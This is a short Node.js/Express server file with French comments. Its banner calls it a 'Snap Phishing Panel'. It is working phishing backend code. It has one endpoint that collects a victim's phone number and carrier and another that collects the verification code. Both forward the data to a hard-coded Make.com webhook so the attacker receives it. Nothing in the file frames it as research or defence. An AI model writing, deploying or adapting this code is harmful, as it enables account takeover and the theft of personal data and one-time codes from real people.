const express = require('express');
const path = require('path');
const app = express();

// ✅ Ton webhook Make.com
const MAKE_WEBHOOK_URL = 'https://hook.eu1.make.com/3yyv4q9ka6w9wfc7en0iocg313p3d6t0';

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// 📱 Étape 1 : Numéro + opérateur
app.post('/api/submit', async (req, res) => {
    const { phone, operator } = req.body;
    if (!phone || !operator) return res.status(400).json({ error: 'Champs manquants' });

    console.log(`[+] Numéro: ${phone} | Opérateur: ${operator}`);

    // Envoi à Make.com
    try {
        await fetch(MAKE_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'phone',
                phone: phone,
                operator: operator,
                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
            })
        });
        console.log('✅ Envoyé à Make.com');
    } catch(e) {
        console.log('❌ Erreur Make.com:', e.message);
    }

    res.json({ success: true });
});

// 🔑 Étape 2 : Code de vérification
app.post('/api/verify', async (req, res) => {
    const { phone, operator, code } = req.body;
    if (!phone || !code) return res.status(400).json({ error: 'Champs manquants' });

    console.log(`[+] Code: ${code} pour ${phone}`);

    // Envoi à Make.com
    try {
        await fetch(MAKE_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'code',
                phone: phone,
                operator: operator || 'Non spécifié',
                code: code,
                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
            })
        });
        console.log('✅ Code envoyé à Make.com');
    } catch(e) {
        console.log('❌ Erreur Make.com:', e.message);
    }

    res.json({ success: true });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════╗
║  📸 Snap Phishing Panel      ║
║  🚀 http://localhost:${PORT}  ║
║  🔗 Make.com actif           ║
╚══════════════════════════════╝
    `);
});
